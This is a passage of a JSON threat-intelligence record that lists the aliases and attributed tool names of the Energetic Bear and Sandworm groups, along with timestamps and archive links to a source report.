            "updated_at": "2025-03-27T02:02:09.878211Z",
            "deleted_at": null,
            "main_name": "Energetic Bear",
            "aliases": [
                "ATK 6",
                "Blue Kraken",
                "Crouching Yeti",
                "Dragonfly",
                "Electrum",
                "Energetic Bear",
                "Ghost Blizzard",
                "Group 24",
                "ITG15",
                "Iron Liberty",
                "Koala Team",
                "TG-4192"
            ],
            "source_name": "ETDA:Energetic Bear",
            "tools": [
                "Backdoor.Oldrea",
                "CRASHOVERRIDE",
                "Commix",
                "CrackMapExec",
                "CrashOverride",
                "Dirsearch",
                "Dorshel",
                "Fertger",
                "Fuerboos",
                "Goodor",
                "Havex",
                "Havex RAT",
                "Hello EK",
                "Heriplor",
                "Impacket",
                "Industroyer",
                "Karagany",
                "Karagny",
                "LightsOut 2.0",
                "LightsOut EK",
                "Listrix",
                "Oldrea",
                "PEACEPIPE",
                "PHPMailer",
                "PsExec",
                "SMBTrap",
                "Subbrute",
                "Sublist3r",
                "Sysmain",
                "Trojan.Karagany",
                "WSO",
                "Webshell by Orb",
                "Win32/Industroyer",
                "Wpscan",
                "nmap",
                "sqlmap",
                "xFrost"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "8941e146-3e7f-4b4e-9b66-c2da052ee6df",
            "created_at": "2023-01-06T13:46:38.402513Z",
            "updated_at": "2025-03-27T02:00:02.824555Z",
            "deleted_at": null,
            "main_name": "Sandworm",
            "aliases": [
                "G0034",
                "IRIDIUM",
                "Blue Echidna",
                "FROZENBARENTS",
                "Seashell Blizzard",
                "IRON VIKING",
                "ELECTRUM",
                "TeleBots",
                "UAC-0113",
                "UAC-0082",
                "APT44",
                "Quedagh",
                "VOODOO BEAR",
                "TEMP.Noble"
            ],
            "source_name": "MISPGALAXY:Sandworm",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        }
    ],
    "ts_created_at": 1673536090,
    "ts_updated_at": 1743041679,
    "ts_creation_date": 1653760809,
    "ts_modification_date": 1653760809,
    "files": {
        "pdf": "https://archive.orkl.eu/bb6aba625886f89b49783851f200ae2944f6610d.pdf",
        "text": "https://archive.orkl.eu/bb6aba625886f89b49783851f200ae2944f6610d.txt",
        "img": "https://archive.orkl.eu/bb6aba625886f89b49783851f200ae2944f6610d.jpg"
    }
}